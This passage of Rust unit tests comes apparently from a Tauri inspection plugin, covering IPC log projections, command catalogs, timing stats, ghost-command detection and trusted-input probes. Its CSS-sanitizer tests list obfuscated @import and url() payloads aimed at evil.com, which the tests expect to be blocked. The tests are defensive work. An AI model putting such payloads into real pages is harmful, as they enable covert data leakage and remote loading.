        assert!(js.contains("getIpcLog()"));
        assert!(js.contains(".map("));
        // No time window applied.
        assert!(!js.contains("Date.now()"));
        assert!(!js.contains("c.timestamp"));
    }

    #[test]
    fn applies_window_when_since_positive() {
        let js = ghost_ipc_projection_js(Some(5000));
        assert!(js.contains("c.timestamp"));
        assert!(js.contains("Date.now() - 5000"));
        // Window is applied before the name projection.
        let win = js.find("Date.now()").unwrap();
        let map = js.find(".map(").unwrap();
        assert!(win < map, "time filter must run before the name map");
    }

    #[test]
    fn ignores_nonpositive_since() {
        assert!(!ghost_ipc_projection_js(Some(0)).contains("Date.now()"));
        assert!(!ghost_ipc_projection_js(Some(-10)).contains("Date.now()"));
    }
}

#[cfg(test)]
mod injected_css_tests {
    use super::sanitize_injected_css;

    #[test]
    fn blocks_at_import() {
        assert!(sanitize_injected_css("@import url(https://evil.com/x.css);", false).is_err());
        // Even hidden behind a comment.
        assert!(sanitize_injected_css("/* x */@import 'https://evil.com';", false).is_err());
        // Comment-splitting obfuscation is caught because comments are stripped first:
        // `@imp/* */ort` collapses to `@import`.
        assert!(sanitize_injected_css("@imp/* */ort url(//evil.com)", false).is_err());
    }

    #[test]
    fn blocks_remote_url() {
        assert!(
            sanitize_injected_css("body{background:url(https://evil.com/x?d=1)}", false).is_err()
        );
        assert!(sanitize_injected_css("body{background:url('//evil.com/x')}", false).is_err());
        assert!(sanitize_injected_css("a{cursor:url(ftp://evil.com/c)}", false).is_err());
    }

    #[test]
    fn allows_local_and_data() {
        assert!(sanitize_injected_css("body{color:red}", false).is_ok());
        assert!(sanitize_injected_css("body{background:url('/assets/x.png')}", false).is_ok());
        assert!(sanitize_injected_css("body{background:url(#grad)}", false).is_ok());
        assert!(
            sanitize_injected_css("body{background:url(data:image/png;base64,AAAA)}", false)
                .is_ok()
        );
    }

    #[test]
    fn allow_remote_opts_back_in() {
        assert!(sanitize_injected_css("@import url(https://fonts.example/x.css);", true).is_ok());
        assert!(
            sanitize_injected_css("body{background:url(https://cdn.example/x.png)}", true).is_ok()
        );
    }

    #[test]
    fn blocks_css_escape_obfuscated_import() {
        // `\40 import` decodes to `@import`; `\100 6d port` style hex escapes too.
        assert!(sanitize_injected_css("\\40 import url(https://evil.com/x.css);", false).is_err());
        assert!(sanitize_injected_css("\\000040import 'https://evil.com';", false).is_err());
        // `\@import` (backslash + literal char) also normalizes to `@import`.
        assert!(sanitize_injected_css("\\@import url(//evil.com)", false).is_err());
    }

    #[test]
    fn blocks_css_escape_obfuscated_remote_url() {
        // `\75 rl(` decodes to `url(` (hex escape + space-terminator).
        assert!(
            sanitize_injected_css("body{background:\\75 rl(https://evil.com/x)}", false).is_err()
        );
        // Escaped protocol-relative `//` via unambiguous 6-digit escapes (matches CSS
        // greedy hex parsing: `\2f` followed by a hex char would eat it, so a real
        // attacker uses the 6-digit or space-terminated form).
        assert!(
            sanitize_injected_css("body{background:url(\\00002f\\00002fevil.com/x)}", false)
                .is_err()
        );
    }

    #[test]
    fn escape_decoding_preserves_legitimate_css() {
        // A legitimately-escaped local content value must still pass.
        assert!(sanitize_injected_css("a::before{content:'\\2022'}", false).is_ok());
        assert!(sanitize_injected_css("body{color:red}", false).is_ok());
    }
}

#[cfg(test)]
mod command_catalog_tests {
    use super::merge_command_catalog;
    use serde_json::json;
    use victauri_core::CommandInfo;

    fn entry(v: &serde_json::Value, name: &str) -> serde_json::Value {
        v.as_array()
            .unwrap()
            .iter()
            .find(|e| e["command"] == json!(name))
            .unwrap_or_else(|| panic!("no catalog entry for {name}"))
            .clone()
    }

    #[test]
    fn observed_commands_carry_shapes_and_stats_and_sort_by_call_count() {
        // Two commands seen on the wire; the busier one must sort first.
        let ipc = vec![
            json!({
                "command": "get_settings", "call_count": 4, "error_count": 0,
                "last_status": "ok",
                "arg_shape": "null",
                "result_shape": { "license": "object", "llm": { "model": "string" } },
            }),
            json!({
                "command": "open_url", "call_count": 9, "error_count": 1,
                "last_status": "ok",
                "arg_shape": { "url": "string" }, "result_shape": "null",
            }),
        ];
        let out = merge_command_catalog(&ipc, &[]);
        assert_eq!(out.len(), 2);
        // Busiest first.
        assert_eq!(out[0]["command"], json!("open_url"));
        assert_eq!(out[0]["observed"], json!(true));
        assert_eq!(out[0]["call_count"], json!(9));
        assert_eq!(out[0]["error_count"], json!(1));
        // The inferred arg shape is preserved verbatim — this is the agent-facing payoff.
        assert_eq!(out[0]["arg_shape"], json!({ "url": "string" }));
        let gs = entry(&json!(out), "get_settings");
        assert_eq!(gs["result_shape"]["llm"]["model"], json!("string"));
    }

    #[test]
    fn registered_but_unobserved_commands_are_included_with_metadata() {
        // A command in the #[inspectable] registry but never seen on the wire must still
        // appear (full command surface), flagged observed:false, with its metadata.
        let info = CommandInfo::new("rare_command")
            .with_description("does a rare thing")
            .with_intent("do the rare thing");
        let out = merge_command_catalog(&[], std::slice::from_ref(&info));
        assert_eq!(out.len(), 1);
        assert_eq!(out[0]["command"], json!("rare_command"));
        assert_eq!(out[0]["observed"], json!(false));
        assert_eq!(out[0]["call_count"], json!(0));
        assert_eq!(out[0]["description"], json!("does a rare thing"));
        assert_eq!(out[0]["intent"], json!("do the rare thing"));
        // No IPC-inferred shape for an unobserved command.
        assert!(out[0].get("arg_shape").is_none());
    }

    #[test]
    fn observed_command_is_enriched_with_registry_metadata_not_duplicated() {
        // Same command both observed AND registered → ONE entry, observed, with the
        // inferred shape PLUS the registry's authoritative declared metadata.
        let ipc = vec![json!({
            "command": "greet", "call_count": 2, "error_count": 0, "last_status": "ok",
            "arg_shape": { "name": "string" }, "result_shape": "string",
        })];
        let info = CommandInfo::new("greet").with_description("greets a user");
        let out = merge_command_catalog(&ipc, std::slice::from_ref(&info));
        assert_eq!(
            out.len(),
            1,
            "must not duplicate an observed+registered command"
        );
        assert_eq!(out[0]["observed"], json!(true));
        assert_eq!(out[0]["arg_shape"], json!({ "name": "string" }));
        assert_eq!(out[0]["description"], json!("greets a user"));
    }
}

#[cfg(test)]
mod ipc_timing_tests {
    use super::{ipc_timing_projection_js, ipc_timing_stats};
    use serde_json::json;

    #[test]
    fn projection_is_body_free() {
        let js = ipc_timing_projection_js(None);
        // Only command + duration are projected — never request/response bodies, so
        // the result stays under the eval cap on busy apps (the bug that made the old
        // full-getIpcLog coverage path return zero).
        assert!(js.contains("c.command"));
        assert!(js.contains("duration_ms"));
        assert!(!js.contains("result"));
        assert!(!js.contains("args"));
        assert!(!js.contains("Date.now()"));
        assert!(ipc_timing_projection_js(Some(5000)).contains("Date.now() - 5000"));
    }

    #[test]
    fn stats_aggregate_per_command_with_percentiles() {
        let entries = vec![
            json!({ "command": "get_settings", "duration_ms": 10.0 }),
            json!({ "command": "get_settings", "duration_ms": 30.0 }),
            json!({ "command": "get_settings", "duration_ms": 20.0 }),
            json!({ "command": "save", "duration_ms": 5.0 }),
        ];
        let stats = ipc_timing_stats(&entries);
        assert_eq!(stats.len(), 2);
        // Sorted by call_count desc — get_settings (3) first.
        assert_eq!(stats[0]["command"], "get_settings");
        assert_eq!(stats[0]["call_count"], 3);
        assert_eq!(stats[0]["timed_samples"], 3);
        assert_eq!(stats[0]["min_ms"], 10.0);
        assert_eq!(stats[0]["max_ms"], 30.0);
        assert_eq!(stats[0]["avg_ms"], 20.0);
        assert_eq!(stats[1]["command"], "save");
        assert_eq!(stats[1]["call_count"], 1);
    }

    #[test]
    fn pending_calls_count_but_do_not_skew_latency() {
        let entries = vec![
            json!({ "command": "run_pipeline", "duration_ms": null }),
            json!({ "command": "run_pipeline", "duration_ms": 100.0 }),
        ];
        let stats = ipc_timing_stats(&entries);
        assert_eq!(stats[0]["call_count"], 2);
        assert_eq!(stats[0]["timed_samples"], 1);
        assert_eq!(stats[0]["avg_ms"], 100.0);
    }

    #[test]
    fn empty_input_yields_empty_stats() {
        assert!(ipc_timing_stats(&[]).is_empty());
    }
}

#[cfg(test)]
mod ghost_report_tests {
    use super::{IpcOutcome, build_ghost_report};
    use victauri_core::{CommandInfo, CommandRegistry};

    fn outcome(command: &str, ok: bool, err: Option<&str>) -> IpcOutcome {
        IpcOutcome {
            command: command.to_string(),
            ok,
            err: err.map(str::to_string),
        }
    }

    #[test]
    fn succeeded_command_is_never_a_ghost() {
        // VIC-1, the exact 4DA false positive: `set_language` is a real command the app uses;
        // it returns success. The old registry-diff flagged it as a ghost (the app has an empty
        // #[inspectable] registry). Outcome-based detection must classify it as a verified
        // handler and NEVER place it in frontend_only.
        let registry = CommandRegistry::new(); // empty — the 4DA scenario
        let v = build_ghost_report(&[outcome("set_language", true, None)], &registry);
        assert_eq!(v["verified_handlers"], 1);
        assert!(
            v["frontend_only"].as_array().unwrap().is_empty(),
            "a command that returned success must not be a ghost"
        );
        assert!(v["confirmed_ghosts"].as_array().unwrap().is_empty());
    }

    #[test]
    fn framework_builtins_are_excluded() {
        // plugin:event|emit / plugin:updater|check are Tauri framework commands, never app ghosts.
        let registry = CommandRegistry::new();
        let outcomes = [
            outcome("plugin:event|emit", false, Some("some error")),
            outcome("plugin:updater|check", false, None),
        ];
        let v = build_ghost_report(&outcomes, &registry);
        assert!(v["frontend_only"].as_array().unwrap().is_empty());
        assert!(v["confirmed_ghosts"].as_array().unwrap().is_empty());
        assert_eq!(v["excluded_builtins"].as_array().unwrap().len(), 2);
    }

    #[test]
    fn not_found_error_is_a_confirmed_ghost() {
        // A frontend call to a command with no handler errors "not found" → confirmed ghost,
        // high confidence, registry-independent. Not double-listed in frontend_only.
        let registry = CommandRegistry::new();
        let v = build_ghost_report(
            &[outcome(
                "get_widgetz",
                false,
                Some("command get_widgetz not found"),
            )],
            &registry,
        );
        let confirmed = v["confirmed_ghosts"].as_array().unwrap();
        assert_eq!(confirmed.len(), 1);
        assert_eq!(confirmed[0]["name"], "get_widgetz");
        assert!(v["frontend_only"].as_array().unwrap().is_empty());
    }

    #[test]
    fn app_level_not_found_is_not_a_confirmed_ghost() {
        // A real command returning an application "X not found" error (here `get_user` →
        // "user not found") must NOT be mistaken for a missing-handler ghost: the message does
        // not reference the command/handler. It falls to the weak candidate tier instead.
        let registry = CommandRegistry::new();
        let v = build_ghost_report(
            &[outcome("get_user", false, Some("user not found"))],
            &registry,
        );
        assert!(
            v["confirmed_ghosts"].as_array().unwrap().is_empty(),
            "an app-level 'not found' must not be a confirmed ghost: {}",
            v["confirmed_ghosts"]
        );
        assert_eq!(v["frontend_only"].as_array().unwrap().len(), 1);
    }

    #[test]
    fn never_succeeded_unregistered_is_a_weak_candidate() {
        // Errored for a NON-not-found reason, not in registry, not a builtin, never succeeded:
        // a frontend_only candidate (weaker tier), not a confirmed ghost.
        let registry = CommandRegistry::new();
        let v = build_ghost_report(
            &[outcome(
                "save_thing",
                false,
                Some("validation failed: bad arg"),
            )],
            &registry,
        );
        assert!(v["confirmed_ghosts"].as_array().unwrap().is_empty());
        let fo = v["frontend_only"].as_array().unwrap();
        assert_eq!(fo.len(), 1);
        assert_eq!(fo[0]["name"], "save_thing");
    }

    #[test]
    fn registered_command_is_not_flagged_even_if_it_only_errored() {
        // A command present in the registry is known to exist; even if it only errored this
        // session it is never frontend_only.
        let registry = CommandRegistry::new();
        registry.register(CommandInfo::new("known_cmd"));
        let v = build_ghost_report(&[outcome("known_cmd", false, Some("oops"))], &registry);
        assert!(v["frontend_only"].as_array().unwrap().is_empty());
    }
}

/// The trusted-input probes run in a real JS engine (jsdom, via the bridge test runner in
/// `tests/bridge_tests/`) against the real bridge script: what they report decides whether
/// OS-level input is sent at all, so their page-side logic is what these tests pin.
#[cfg(test)]
mod trusted_probe_js_tests {
    use super::{trusted_click_probe_js, trusted_focus_probe_js};
    use std::io::Write;
    use std::path::PathBuf;

    fn runner_dir() -> PathBuf {
        PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("tests")
            .join("bridge_tests")
    }

    /// One case: (name, page html, setup js, `findElements` query for the target, probe).
    type Case<'a> = (&'a str, &'a str, &'a str, &'a str, String);

    /// Each probe is built for the placeholder ref `__VREF__` and run after resolving the
    /// real ref of the first element the case's query matches. Returns each case's result,
    /// or `None` when jsdom is not installed (and nothing requires it).
    fn run(cases: &[Case<'_>]) -> Option<Vec<serde_json::Value>> {
        if !runner_dir().join("node_modules").join("jsdom").exists() {
            assert!(
                std::env::var_os("CI").is_none()
                    && std::env::var_os("VICTAURI_REQUIRE_JSDOM").is_none(),
                "jsdom is not installed: `npm ci` in crates/victauri-plugin/tests/bridge_tests/"
            );
            eprintln!("SKIP: jsdom not installed");
            return None;
        }
        let tests: Vec<serde_json::Value> = cases
            .iter()
            .map(|(name, html, setup_js, find_query, probe)| {
                let code = format!(
                    "var __found = window.__VICTAURI__.findElements({find_query}); \
                     if (!__found.length) throw new Error('fixture element not found'); \
                     var __vref = __found[0].ref_id;\n{}",
                    probe.replace("\"__VREF__\"", "__vref")
                );
                serde_json::json!({
                    "name": name, "code": code,
                    "setup_html": html, "setup_js": setup_js,
                })
            })
            .collect();
        let def = serde_json::json!({
            "bridge_script": crate::js_bridge::init_script(
                &crate::js_bridge::BridgeCapacities::default()
            ),
            "setup_html": "<html><body></body></html>",
            "tests": tests,
        });
        let mut tmp = tempfile::NamedTempFile::new().unwrap();
        tmp.write_all(def.to_string().as_bytes()).unwrap();
        tmp.flush().unwrap();
        let out = std::process::Command::new("node")
            .arg(runner_dir().join("run_tests.js"))
            .arg(tmp.path())
            .output()
            .expect("run node");
        let stdout = String::from_utf8_lossy(&out.stdout);
        let line = stdout
            .lines()
            .find_map(|l| l.strip_prefix("VICTAURI_RESULTS:"))
            .unwrap_or_else(|| {
                panic!(
                    "no results: {stdout}\n{}",
                    String::from_utf8_lossy(&out.stderr)
                )
            });
        let results: Vec<serde_json::Value> = serde_json::from_str(line).unwrap();
        Some(
            results
                .into_iter()
                .map(|r| {
                    assert_eq!(r["passed"], true, "{}: {}", r["name"], r["error"]);
                    r["result"].clone()
                })
                .collect(),
        )
    }

    const FORM: &str = r#"<html><body>
        <input id="target" placeholder="target">
        <input id="other" placeholder="other">
        <div id="plain">not focusable</div>
        <div id="host"></div>
    </body></html>"#;

    /// R4-IN1: the focus probe must report whether focus LANDED on the element, not
    /// whether the element exists — keys go to whatever holds focus.
    #[test]
    fn focus_probe_reports_where_focus_actually_landed() {
        let probe = trusted_focus_probe_js("__VREF__");
        let shadow_setup = "var r = document.getElementById('host').attachShadow({mode:'open'}); \
                            r.innerHTML = '<input placeholder=\"in-shadow\">';";
        let Some(results) = run(&[
            (
                "plain input",
                FORM,
                "",
                "{placeholder:'target'}",
                probe.clone(),
            ),
            (
                "a focus handler moves focus elsewhere",
                FORM,
                "document.getElementById('target').addEventListener('focus', function () { \
                   document.getElementById('other').focus(); });",
                "{placeholder:'target'}",
                probe.clone(),
            ),
            (
                "element that cannot take focus",
                FORM,
                "",
                "{css:'#plain'}",
                probe.clone(),
            ),
            (
                "input inside an open shadow root",
                FORM,
                shadow_setup,
                "{placeholder:'in-shadow'}",
                probe.clone(),
            ),
        ]) else {
            return;
        };
        let focused = |v: &serde_json::Value| v["focused"] == true && v["found"] == true;
        assert!(focused(&results[0]), "plain input: {}", results[0]);
        assert!(!focused(&results[1]), "focus moved away: {}", results[1]);
        assert_eq!(results[1]["found"], true, "{}", results[1]);
        assert!(!focused(&results[2]), "not focusable: {}", results[2]);
        assert!(focused(&results[3]), "shadow input: {}", results[3]);
    }

    const PAGE: &str = r#"<html><body>
        <button id="btn">Go</button>
        <button id="off" disabled>Off</button>
        <div id="cover">cover</div>
        <div id="frame-host"></div>
    </body></html>"#;

    /// A hit-test for jsdom (which has no layout): the element under any point is `#btn`,
    /// unless a case replaces `window.__hit`.
    const HIT_TEST: &str = "window.__hit = function (doc) { \
                            return doc.getElementById('btn') || doc.body; }; \
                            document.elementFromPoint = function (x, y) { \
                            return window.__hit(document, x, y); };";

    /// R4-IN2: the trusted-click probe takes coordinates from page-controlled layout, so it
    /// must refuse a point that is off-screen, covered or on a disabled element (the OS click
    /// would land on something else), and must add a same-origin frame's offset.
    #[test]
    fn click_probe_refuses_unclickable_points_and_offsets_frames() {
        let probe = trusted_click_probe_js("__VREF__");
        let off_screen = format!(
            "{HIT_TEST} var b = document.getElementById('btn'); \
             b.getBoundingClientRect = function () {{ return {{left: 5000, top: 10, \
             width: 80, height: 32, right: 5080, bottom: 42, x: 5000, y: 10}}; }};"
        );
        let covered = format!(
            "{HIT_TEST} window.__hit = function (doc) {{ return doc.getElementById('cover'); }};"
        );
        let in_frame = "var f = document.createElement('iframe'); \
             document.getElementById('frame-host').appendChild(f); \
             var fw = f.contentWindow, fd = f.contentDocument; \
             fd.body.innerHTML = '<button id=\"inner\">In frame</button>'; \
             var baseRect = window.HTMLElement.prototype.getBoundingClientRect; \
             fw.HTMLElement.prototype.getBoundingClientRect = baseRect; \
             fw.HTMLElement.prototype.scrollIntoView = function () {}; \
             window.HTMLElement.prototype.getBoundingClientRect = function () { \
               if (this.tagName === 'IFRAME') return {left: 100, top: 200, width: 300, \
                 height: 150, right: 400, bottom: 350, x: 100, y: 200}; \
               return baseRect.call(this); }; \
             fd.elementFromPoint = function () { return fd.getElementById('inner'); }; \
             document.elementFromPoint = function () { return f; };";
        let Some(results) = run(&[
            (
                "visible button",
                PAGE,
                HIT_TEST,
                "{css:'#btn'}",
                probe.clone(),
            ),
            (
                "button laid out off-screen",
                PAGE,
                &off_screen,
                "{css:'#btn'}",
                probe.clone(),
            ),
            (
                "button covered by another element",
                PAGE,
                &covered,
                "{css:'#btn'}",
                probe.clone(),
            ),
            (
                "disabled button",
                PAGE,
                HIT_TEST,
                "{css:'#off'}",
                probe.clone(),
            ),
            (
                "button in a same-origin iframe",
                PAGE,
                in_frame,
                "{tag:'button', text:'In frame'}",
                probe.clone(),
            ),
        ]) else {
            return;
        };
        // jsdom's stub lays every BUTTON out at (10,10) 80×32: center (50, 26).
        assert_eq!(results[0]["x"], 50.0, "{}", results[0]);
        assert_eq!(results[0]["y"], 26.0, "{}", results[0]);
        for (i, why) in [(1, "off-screen"), (2, "covered"), (3, "disabled")] {
            assert!(
                results[i]["error"].is_string() && results[i].get("x").is_none(),
                "{why}: {}",
                results[i]
            );
        }
        // Frame content origin (100, 200) + the button's center inside the frame (50, 26).
        assert_eq!(results[4]["x"], 150.0, "{}", results[4]);
        assert_eq!(results[4]["y"], 226.0, "{}", results[4]);
    }
}
